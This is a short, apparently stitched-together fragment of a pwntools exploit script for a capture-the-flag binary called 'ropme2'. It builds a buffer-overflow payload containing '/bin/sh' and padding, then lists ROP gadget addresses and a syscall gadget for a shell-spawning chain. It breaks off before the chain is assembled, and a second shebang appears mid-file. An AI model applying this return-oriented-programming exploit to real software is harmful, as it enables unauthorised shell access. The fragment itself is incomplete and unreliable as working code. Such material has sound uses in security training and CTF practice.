from pwn import *

payload = "DEBUG\x0a\x00/bin/sh\x00"
payload += "A"*200
#!/usr/bin/python

from pwn import *
import string
import re
import time

BINARY = './ropme2'
BUFFSIZE = 216
CONTEXT = 'INFO'

pop_rdi = p64(0x40142b)
pop_rsi = p64(0x401429)
pop_rax = p64(0x401162)
pop_rdx = p64(0x401164)
read_addr = p64(0x4033f0)
syscall = p64(0x401168)
dynamic = p64(0x4031e8)
main_addr = p64(0x401080)
format_addr = p64(0x402020)


